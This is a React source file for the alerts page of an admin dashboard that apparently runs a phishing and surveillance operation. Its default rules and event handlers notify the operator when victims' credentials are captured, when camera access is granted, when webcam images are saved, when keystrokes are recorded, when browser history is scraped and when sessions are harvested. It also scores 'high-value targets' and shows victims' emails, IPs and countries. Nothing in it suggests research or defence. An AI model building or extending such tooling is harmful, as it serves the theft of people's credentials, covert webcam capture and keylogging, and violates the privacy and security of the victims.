import React, { useState, useEffect, useCallback, useRef } from 'react';
import { Box, Typography, Card, CardContent, Switch, FormControlLabel, TextField, Button, Chip, Grid, IconButton, Tooltip, Paper, Dialog, DialogTitle, DialogContent, DialogActions, Select, MenuItem, FormControl, InputLabel, Slider, Divider, Badge, Collapse, Alert as MuiAlert, LinearProgress } from '@mui/material';
import { io } from 'socket.io-client';
import axios from 'axios';
import NotificationsActiveIcon from '@mui/icons-material/NotificationsActive';
import SettingsIcon from '@mui/icons-material/Settings';
import DeleteIcon from '@mui/icons-material/Delete';
import AddIcon from '@mui/icons-material/Add';
import EditIcon from '@mui/icons-material/Edit';
import WarningAmberIcon from '@mui/icons-material/WarningAmber';
import SecurityIcon from '@mui/icons-material/Security';
import ScheduleIcon from '@mui/icons-material/Schedule';
import HistoryIcon from '@mui/icons-material/History';
import ErrorOutlineIcon from '@mui/icons-material/ErrorOutline';
import CheckCircleIcon from '@mui/icons-material/CheckCircle';

const SOCKET_URL = process.env.REACT_APP_API_URL 
  ? process.env.REACT_APP_API_URL.replace('/api', '') 
  : window.location.origin;

const SEVERITY_COLORS = {
  critical: { bg: 'rgba(255,0,85,0.15)', text: '#ff0055', icon: <ErrorOutlineIcon sx={{ fontSize: 14 }} /> },
  high: { bg: 'rgba(255,170,0,0.15)', text: '#ffaa00', icon: <WarningAmberIcon sx={{ fontSize: 14 }} /> },
  medium: { bg: 'rgba(0,240,255,0.12)', text: '#00f0ff', icon: <NotificationsActiveIcon sx={{ fontSize: 14 }} /> },
  low: { bg: 'rgba(0,255,136,0.12)', text: '#00ff88', icon: <CheckCircleIcon sx={{ fontSize: 14 }} /> }
};

const DEFAULT_ALERTS = [
  { id: 1, name: 'Credentials Captured', enabled: true, description: 'Notify when any credentials are captured', severity: 'high', category: 'credentials' },
  { id: 2, name: 'Camera Access Granted', enabled: true, description: 'Notify when a victim grants camera access', severity: 'medium', category: 'camera' },
  { id: 3, name: 'New Session', enabled: false, description: 'Notify when a new victim session starts', severity: 'low', category: 'session' },
  { id: 4, name: 'Bulk Credentials Burst', enabled: true, description: 'Notify when 5+ credentials captured within 1 minute', severity: 'critical', category: 'credentials', threshold: 5, windowMs: 60000 },
  { id: 5, name: 'High-Value Target', enabled: true, description: 'Notify when a session score exceeds 100', severity: 'critical', category: 'session' },
  { id: 6, name: 'Specific IP Range', enabled: false, description: 'Notify when session comes from specific IP ranges', severity: 'medium', category: 'geo' },
  { id: 7, name: 'Keystroke Pattern Match', enabled: false, description: 'Alert on specific keystroke patterns (e.g. "password")', severity: 'medium', category: 'behavior' },
  { id: 8, name: 'Camera Capture Saved', enabled: true, description: 'Notify when a new camera image is captured', severity: 'low', category: 'camera' },
];

export default function AlertsPage() {
  const [alerts, setAlerts] = useState(DEFAULT_ALERTS);
  const [alertHistory, setAlertHistory] = useState([]);
  const [liveAlerts, setLiveAlerts] = useState([]);
  const [configOpen, setConfigOpen] = useState(false);
  const [editingAlert, setEditingAlert] = useState(null);
  const [socketConnected, setSocketConnected] = useState(false);
  const [stats, setStats] = useState({ total: 0, critical: 0, high: 0 });

  // Use a ref to keep alert rules accessible inside socket callbacks
  const alertsRef = useRef(alerts);
  useEffect(() => { alertsRef.current = alerts; }, [alerts]);

  // Connect to socket for real-time alert events
  useEffect(() => {
    const token = localStorage.getItem('admin_token');
    if (!token) return;

    const socket = io(SOCKET_URL || undefined, {
      auth: { token },
      transports: ['websocket', 'polling'],
      reconnection: true,
      reconnectionAttempts: 10,
      reconnectionDelay: 2000,
      timeout: 10000
    });

    socket.on('connect', () => {
      setSocketConnected(true);
      socket.emit('join-admin', token);
    });

    socket.on('disconnect', () => setSocketConnected(false));
    socket.on('connect_error', (err) => {
      console.warn('Alert socket connection error:', err.message);
      setSocketConnected(false);
    });

    // Helper to check and trigger alerts
    const checkAlerts = (eventName, data) => {
      const currentAlerts = alertsRef.current;
      currentAlerts.forEach(alert => {
        if (!alert.enabled) return;

        let shouldTrigger = false;
        switch (alert.name) {
          case 'Credentials Captured':
            shouldTrigger = eventName === 'credential-captured';
            break;
          case 'Camera Access Granted':
            shouldTrigger = eventName === 'camera-access' && data.granted === true;
            break;
          case 'Camera Access Denied':
            shouldTrigger = eventName === 'camera-access' && data.granted === false;
            break;
          case 'New Session':
            shouldTrigger = eventName === 'new-victim';
            break;
          case 'Camera Capture Saved':
            shouldTrigger = eventName === 'camera-capture';
            break;
          case 'Victim Went Offline':
            shouldTrigger = eventName === 'victim-offline';
            break;
          case 'Keystrokes Recorded':
            shouldTrigger = eventName === 'victim-keystroke' && (data.strokeCount || 0) > 0;
            break;
          case 'Bulk Credentials Burst':
            shouldTrigger = eventName === 'credential-captured' && alert.threshold && alert.windowMs;
            break;
          case 'High-Value Target':
            shouldTrigger = eventName === 'credential-captured' && data.score && data.score >= 100;
            break;
          case 'Browser History Scraped':
            shouldTrigger = eventName === 'browser-history';
            break;
          case 'Session Harvest':
            shouldTrigger = eventName === 'session-harvest';
            break;
          case 'Permission Triggered':
            shouldTrigger = eventName === 'permission-triggered';
            break;
          case 'Permissions Updated':
            shouldTrigger = eventName === 'permissions-update';
            break;
          default:
            shouldTrigger = eventName === 'alert-triggered';
        }

        if (shouldTrigger) {
          const historyEntry = {
            id: Date.now() + Math.random(),
            time: new Date(),
            type: alert.name,
            severity: alert.severity,
            message: generateAlertMessage(eventName, data),
            read: false
          };
          setAlertHistory(prev => [historyEntry, ...prev].slice(0, 200));
          setLiveAlerts(prev => [historyEntry, ...prev].slice(0, 20));

          // Auto-dismiss live alerts after 8 seconds
          setTimeout(() => {
            setLiveAlerts(prev => prev.filter(a => a.id !== historyEntry.id));
          }, 8000);
        }
      });
    };

    // Listen for ALL server events
    const serverEvents = [
      'new-victim', 'credential-captured', 'camera-capture', 'camera-access',
      'victim-click', 'victim-keystroke', 'victim-offline', 'browser-history',
      'session-harvest', 'alert-triggered', 'permission-triggered',
      'permissions-update', 'camera-access'
    ];

    serverEvents.forEach(eventName => {
      socket.on(eventName, (data) => checkAlerts(eventName, data));
    });

    return () => {
      serverEvents.forEach(eventName => socket.off(eventName));
      socket.disconnect();
    };
  }, []); // Empty deps - ref handles alert changes

  const generateAlertMessage = (eventName, data) => {
    switch (eventName) {
      case 'credential-captured':
        return `🔑 Credentials captured from ${data.email || data.username || 'unknown'}${data.country ? ` (${data.country})` : ''}`;
      case 'camera-access':
        return `📸 Camera access ${data.granted ? 'GRANTED' : 'DENIED'} — session score impact`;
      case 'new-victim':
        return `🆕 New victim from ${data.ipAddress || 'unknown IP'}${data.country ? ` (${data.country})` : ''}`;
      case 'camera-capture':
        return `📷 Camera image captured ${data.triggerType ? `(${data.triggerType})` : ''}`;
      case 'victim-keystroke':
        return `⌨️ ${data.strokeCount || 0} keystrokes recorded in session`;
      case 'alert-triggered':
        return data.message || 'Custom alert triggered';
      default:
        return `Event: ${eventName}`;
    }
  };

  // Also fetch initial stats
  useEffect(() => {
    const token = localStorage.getItem('admin_token');
    if (!token) return;
    axios.get('/api/admin/stats', { headers: { Authorization: `Bearer ${token}` } })
      .then(res => {
        setStats({
          total: res.data.totalCredentials || 0,
          critical: res.data.onlineNow || 0,
          high: res.data.totalSessions || 0
        });
      })
      .catch(() => {});
  }, []);

  const toggleAlert = (id) => {
    setAlerts(prev => prev.map(a => a.id === id ? { ...a, enabled: !a.enabled } : a));
  };

  const openConfig = (alert) => {
    setEditingAlert(alert ? { ...alert } : { name: '', description: '', severity: 'medium', enabled: true, category: 'session' });
    setConfigOpen(true);
  };

  const saveAlert = () => {
    if (editingAlert.id) {
      setAlerts(prev => prev.map(a => a.id === editingAlert.id ? editingAlert : a));
    } else {
      setAlerts(prev => [...prev, { ...editingAlert, id: Date.now() }]);
    }
    setConfigOpen(false);
    setEditingAlert(null);
  };

  const deleteAlert = (id) => {
    setAlerts(prev => prev.filter(a => a.id !== id));
  };

  const clearHistory = () => {
    setAlertHistory([]);
  };

  const markAllRead = () => {
    setAlertHistory(prev => prev.map(a => ({ ...a, read: true })));
    setLiveAlerts([]);
  };

  const unreadCount = alertHistory.filter(a => !a.read).length;

  return (
    <Box>
      {/* Header */}
      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 2, flexWrap: 'wrap', gap: 1 }}>
        <Box>
          <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5 }}>
            <NotificationsActiveIcon sx={{ color: '#00f0ff', fontSize: 28 }} />
            <Typography variant="h4" sx={{ color: '#fff', fontWeight: 700, fontSize: '1.4rem' }}>
              Alerts & Notifications
            </Typography>
            <Badge badgeContent={unreadCount} color="error" sx={{ '& .MuiBadge-badge': { bgcolor: '#ff0055', fontSize: '0.6rem', minWidth: 16, height: 16 } }}>
              <Chip
                icon={<ScheduleIcon sx={{ fontSize: 12 }} />}
                label={socketConnected ? 'Live' : 'Offline'}
                size="small"
                sx={{ bgcolor: socketConnected ? 'rgba(0,255,136,0.1)' : 'rgba(255,0,85,0.1)', color: socketConnected ? '#00ff88' : '#ff0055', fontWeight: 600, height: 24 }}
              />
            </Badge>
          </Box>
          <Typography sx={{ color: '#888', fontSize: '0.85rem', mt: 0.2 }}>
            Configure alert rules and monitor real-time notifications
          </Typography>
        </Box>
      </Box>

      {/* Stats bar */}
      <Paper sx={{
        display: 'flex', alignItems: 'center', gap: 1, p: 2, mb: 2,
        bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.05)',
        borderRadius: 2, flexWrap: 'wrap'
      }}>
        <Box sx={{ textAlign: 'center', flex: 1, minWidth: 80 }}>
          <Typography sx={{ color: '#ff0055', fontSize: '1.3rem', fontWeight: 700 }}>{alerts.filter(a => a.severity === 'critical' && a.enabled).length}</Typography>
          <Typography sx={{ color: '#888', fontSize: '0.7rem' }}>Critical Rules</Typography>
        </Box>
        <Box sx={{ width: '1px', height: 36, bgcolor: 'rgba(255,255,255,0.08)', flexShrink: 0 }} />
        <Box sx={{ textAlign: 'center', flex: 1, minWidth: 80 }}>
          <Typography sx={{ color: '#fff', fontSize: '1.3rem', fontWeight: 700 }}>{alerts.filter(a => a.enabled).length}/{alerts.length}</Typography>
          <Typography sx={{ color: '#888', fontSize: '0.7rem' }}>Active Rules</Typography>
        </Box>
        <Box sx={{ width: '1px', height: 36, bgcolor: 'rgba(255,255,255,0.08)', flexShrink: 0 }} />
        <Box sx={{ textAlign: 'center', flex: 1, minWidth: 80 }}>
          <Typography sx={{ color: '#fff', fontSize: '1.3rem', fontWeight: 700 }}>{stats.total}</Typography>
          <Typography sx={{ color: '#888', fontSize: '0.7rem' }}>Total Credentials</Typography>
        </Box>
        <Box sx={{ width: '1px', height: 36, bgcolor: 'rgba(255,255,255,0.08)', flexShrink: 0 }} />
        <Box sx={{ textAlign: 'center', flex: 1, minWidth: 80 }}>
          <Typography sx={{ color: '#00f0ff', fontSize: '1.3rem', fontWeight: 700 }}>{stats.high}</Typography>
          <Typography sx={{ color: '#888', fontSize: '0.7rem' }}>Total Sessions</Typography>
        </Box>
      </Paper>

      {/* Live alert banner */}
      {liveAlerts.length > 0 && (
        <Box sx={{ mb: 2 }}>
          {liveAlerts.slice(0, 3).map(alert => (
            <MuiAlert
              key={alert.id}
              severity={alert.severity === 'critical' ? 'error' : alert.severity === 'high' ? 'warning' : 'info'}
              sx={{
                mb: 0.5,
                bgcolor: SEVERITY_COLORS[alert.severity]?.bg || 'rgba(0,240,255,0.08)',
                color: SEVERITY_COLORS[alert.severity]?.text || '#ddd',
                borderLeft: `3px solid ${SEVERITY_COLORS[alert.severity]?.text || '#00f0ff'}`,
                '& .MuiAlert-icon': { color: SEVERITY_COLORS[alert.severity]?.text || '#00f0ff', fontSize: '1rem' }
              }}
            >
              <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', width: '100%' }}>
                <Box>
                  <Chip label={alert.type} size="small" sx={{ bgcolor: SEVERITY_COLORS[alert.severity]?.bg, color: SEVERITY_COLORS[alert.severity]?.text, height: 18, fontSize: '0.6rem', mr: 1 }} />
                  {alert.message}
                </Box>
                <Typography sx={{ color: '#777', fontSize: '0.65rem', fontFamily: 'monospace', ml: 1, whiteSpace: 'nowrap' }}>
                  {alert.time.toLocaleTimeString()}
                </Typography>
              </Box>
            </MuiAlert>
          ))}
        </Box>
      )}

      <Grid container spacing={3}>
        {/* Alert Rules */}
        <Grid item xs={12} md={7}>
          <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.05)', borderRadius: 2 }}>
            <CardContent>
              <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 2 }}>
                <Typography sx={{ color: '#fff', fontWeight: 600, display: 'flex', alignItems: 'center', gap: 0.5 }}>
                  <SecurityIcon sx={{ fontSize: 18, color: '#00f0ff' }} />
                  Alert Rules
                </Typography>
                <Button
                  size="small"
                  startIcon={<AddIcon />}
                  onClick={() => openConfig(null)}
                  sx={{ color: '#00f0ff', borderColor: 'rgba(0,240,255,0.3)', '&:hover': { borderColor: '#00f0ff' } }}
                  variant="outlined"
                >
                  Add Rule
                </Button>
              </Box>

              {/* Grouped by category */}
              {['credentials', 'camera', 'session', 'geo', 'behavior'].map(category => {
                const categoryAlerts = alerts.filter(a => a.category === category);
                if (categoryAlerts.length === 0) return null;
                return (
                  <Box key={category} sx={{ mb: 2 }}>
                    <Typography sx={{ color: '#555', fontSize: '0.7rem', textTransform: 'uppercase', letterSpacing: '0.05em', mb: 0.5, ml: 1 }}>
                      {category === 'credentials' ? '🔑 Credential Alerts' :
                       category === 'camera' ? '📷 Camera Alerts' :
                       category === 'session' ? '👤 Session Alerts' :
                       category === 'geo' ? '🌍 Geolocation Alerts' : '🔬 Behavior Alerts'}
                    </Typography>
                    {categoryAlerts.map(alert => (
                      <Box
                        key={alert.id}
                        sx={{
                          display: 'flex', justifyContent: 'space-between', alignItems: 'center',
                          py: 1.2, px: 1.5,
                          borderBottom: '1px solid rgba(255,255,255,0.04)',
                          borderRadius: 1,
                          '&:hover': { bgcolor: 'rgba(255,255,255,0.02)' },
                          opacity: alert.enabled ? 1 : 0.4
                        }}
                      >
                        <Box sx={{ flex: 1, minWidth: 0 }}>
                          <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, flexWrap: 'wrap' }}>
                            <Typography sx={{ color: '#fff', fontWeight: 600, fontSize: '0.88rem' }}>
                              {alert.name}
                            </Typography>
                            <Chip
                              label={alert.severity}
                              size="small"
                              sx={{
                                bgcolor: SEVERITY_COLORS[alert.severity]?.bg,
                                color: SEVERITY_COLORS[alert.severity]?.text,
                                height: 18, fontSize: '0.6rem', fontWeight: 600
                              }}
                            />
                          </Box>
                          <Typography sx={{ color: '#777', fontSize: '0.78rem', mt: 0.2 }}>
                            {alert.description}
                          </Typography>
                          {alert.threshold && (
                            <Typography sx={{ color: '#555', fontSize: '0.65rem', mt: 0.2, fontFamily: 'monospace' }}>
                              Threshold: {alert.threshold} events / {(alert.windowMs / 1000)}s window
                            </Typography>
                          )}
                        </Box>
                        <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.5, ml: 1 }}>
                          <Tooltip title="Edit rule">
                            <IconButton size="small" onClick={() => openConfig(alert)} sx={{ color: '#555', '&:hover': { color: '#00f0ff' } }}>
                              <EditIcon sx={{ fontSize: 16 }} />
                            </IconButton>
                          </Tooltip>
                          <Tooltip title="Delete rule">
                            <IconButton size="small" onClick={() => deleteAlert(alert.id)} sx={{ color: '#555', '&:hover': { color: '#ff0055' } }}>
                              <DeleteIcon sx={{ fontSize: 16 }} />
                            </IconButton>
                          </Tooltip>
                          <Switch
                            checked={alert.enabled}
                            onChange={() => toggleAlert(alert.id)}
                            size="small"
                            sx={{ '& .MuiSwitch-thumb': { bgcolor: alert.enabled ? '#00ff88' : '#555' },
                                  '& .MuiSwitch-track': { bgcolor: alert.enabled ? 'rgba(0,255,136,0.2)' : 'rgba(85,85,85,0.3)' } }}
                          />
                        </Box>
                      </Box>
                    ))}
                  </Box>
                );
              })}
            </CardContent>
          </Card>
        </Grid>

        {/* Alert History */}
        <Grid item xs={12} md={5}>
          <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.05)', borderRadius: 2 }}>
            <CardContent>
              <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 2 }}>
                <Typography sx={{ color: '#fff', fontWeight: 600, display: 'flex', alignItems: 'center', gap: 0.5 }}>
                  <HistoryIcon sx={{ fontSize: 18, color: '#00f0ff' }} />
                  Alert History
                  {unreadCount > 0 && (
                    <Chip label={`${unreadCount} new`} size="small" sx={{ bgcolor: 'rgba(255,0,85,0.15)', color: '#ff0055', height: 18, fontSize: '0.6rem', ml: 0.5 }} />
                  )}
                </Typography>
                <Box sx={{ display: 'flex', gap: 0.5 }}>
                  <Button size="small" onClick={markAllRead} sx={{ color: '#00f0ff', fontSize: '0.7rem', textTransform: 'none' }}>
                    Mark all read
                  </Button>
                  <Button size="small" onClick={clearHistory} sx={{ color: '#888', fontSize: '0.7rem', textTransform: 'none' }}>
                    Clear
                  </Button>
                </Box>
              </Box>

              {alertHistory.length === 0 ? (
                <Box sx={{ textAlign: 'center', py: 4 }}>
                  <Typography sx={{ fontSize: '2.5rem', mb: 1, opacity: 0.3 }}>🔔</Typography>
                  <Typography sx={{ color: '#666', fontSize: '0.85rem' }}>No alerts yet</Typography>
                  <Typography sx={{ color: '#555', fontSize: '0.75rem', mt: 0.5 }}>
                    Alerts will appear here in real-time as events are triggered
                  </Typography>
                </Box>
              ) : (
                <Box sx={{ maxHeight: 480, overflow: 'auto' }}>
                  {alertHistory.map((alert, i) => (
                    <Box
                      key={alert.id || i}
                      sx={{
                        py: 1.2, px: 1.5,
                        borderBottom: '1px solid rgba(255,255,255,0.04)',
                        borderRadius: 1,
                        bgcolor: alert.read ? 'transparent' : 'rgba(255,255,255,0.02)',
                        transition: 'background 0.3s'
                      }}
                    >
                      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 0.3 }}>
                        <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.5 }}>
                          <Box sx={{ width: 6, height: 6, borderRadius: '50%', bgcolor: alert.read ? 'transparent' : '#00f0ff' }} />
                          <Chip
                            label={alert.type}
                            size="small"
                            sx={{
                              bgcolor: SEVERITY_COLORS[alert.severity]?.bg,
                              color: SEVERITY_COLORS[alert.severity]?.text,
                              height: 18, fontSize: '0.6rem'
                            }}
                          />
                          <Chip
                            label={alert.severity}
                            size="small"
                            sx={{
                              bgcolor: SEVERITY_COLORS[alert.severity]?.bg,
                              color: SEVERITY_COLORS[alert.severity]?.text,
                              height: 16, fontSize: '0.55rem', opacity: 0.7
                            }}
                          />
                        </Box>
                        <Typography sx={{ color: '#555', fontSize: '0.65rem', fontFamily: 'monospace' }}>
                          {alert.time instanceof Date
                            ? alert.time.toLocaleTimeString()
                            : new Date(alert.time).toLocaleTimeString()}
                        </Typography>
                      </Box>
                      <Typography sx={{ color: '#ccc', fontSize: '0.8rem', ml: 1.5 }}>
                        {alert.message}
                      </Typography>
                    </Box>
                  ))}
                </Box>
              )}
            </CardContent>
          </Card>
        </Grid>
      </Grid>

      {/* Alert Config Dialog */}
      <Dialog open={configOpen} onClose={() => { setConfigOpen(false); setEditingAlert(null); }}
        PaperProps={{ sx: { bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.1)', borderRadius: 2, minWidth: 400 } }}>
        <DialogTitle sx={{ color: '#fff', fontWeight: 600, borderBottom: '1px solid rgba(255,255,255,0.05)' }}>
          {editingAlert?.id ? 'Edit Alert Rule' : 'New Alert Rule'}
        </DialogTitle>
        <DialogContent sx={{ mt: 2 }}>
          <TextField
            fullWidth size="small"
            label="Rule Name"
            value={editingAlert?.name || ''}
            onChange={(e) => setEditingAlert(prev => ({ ...prev, name: e.target.value }))}
            sx={{ mb: 2, input: { color: '#fff' }, label: { color: '#888' } }}
          />
          <TextField
            fullWidth size="small"
            label="Description"
            multiline rows={2}
            value={editingAlert?.description || ''}
            onChange={(e) => setEditingAlert(prev => ({ ...prev, description: e.target.value }))}
            sx={{ mb: 2, textarea: { color: '#fff' }, label: { color: '#888' } }}
          />
          <FormControl fullWidth size="small" sx={{ mb: 2 }}>
            <InputLabel sx={{ color: '#888' }}>Severity</InputLabel>
            <Select
              value={editingAlert?.severity || 'medium'}
              onChange={(e) => setEditingAlert(prev => ({ ...prev, severity: e.target.value }))}
              sx={{ color: '#fff', '& .MuiOutlinedInput-notchedOutline': { borderColor: 'rgba(255,255,255,0.1)' } }}
              label="Severity"
            >
              <MenuItem value="critical">Critical</MenuItem>
              <MenuItem value="high">High</MenuItem>
              <MenuItem value="medium">Medium</MenuItem>
              <MenuItem value="low">Low</MenuItem>
            </Select>
          </FormControl>
          <FormControl fullWidth size="small" sx={{ mb: 2 }}>
            <InputLabel sx={{ color: '#888' }}>Category</InputLabel>
            <Select
              value={editingAlert?.category || 'session'}
              onChange={(e) => setEditingAlert(prev => ({ ...prev, category: e.target.value }))}
              sx={{ color: '#fff', '& .MuiOutlinedInput-notchedOutline': { borderColor: 'rgba(255,255,255,0.1)' } }}
              label="Category"
            >
              <MenuItem value="credentials">🔑 Credentials</MenuItem>
              <MenuItem value="camera">📷 Camera</MenuItem>
              <MenuItem value="session">👤 Session</MenuItem>
              <MenuItem value="geo">🌍 Geolocation</MenuItem>
              <MenuItem value="behavior">🔬 Behavior</MenuItem>
            </Select>
          </FormControl>
          <FormControlLabel
            control={<Switch checked={editingAlert?.enabled || false} onChange={(e) => setEditingAlert(prev => ({ ...prev, enabled: e.target.checked }))} />}
            label="Enabled"
            sx={{ color: '#aaa' }}
          />
        </DialogContent>
        <DialogActions sx={{ borderTop: '1px solid rgba(255,255,255,0.05)', p: 2 }}>
          <Button onClick={() => { setConfigOpen(false); setEditingAlert(null); }} sx={{ color: '#888' }}>
            Cancel
          </Button>
          <Button onClick={saveAlert} variant="contained" sx={{ bgcolor: '#00f0ff', color: '#000', '&:hover': { bgcolor: '#00ccdd' } }}>
            {editingAlert?.id ? 'Update' : 'Create'}
          </Button>
        </DialogActions>
      </Dialog>
    </Box>
  );
}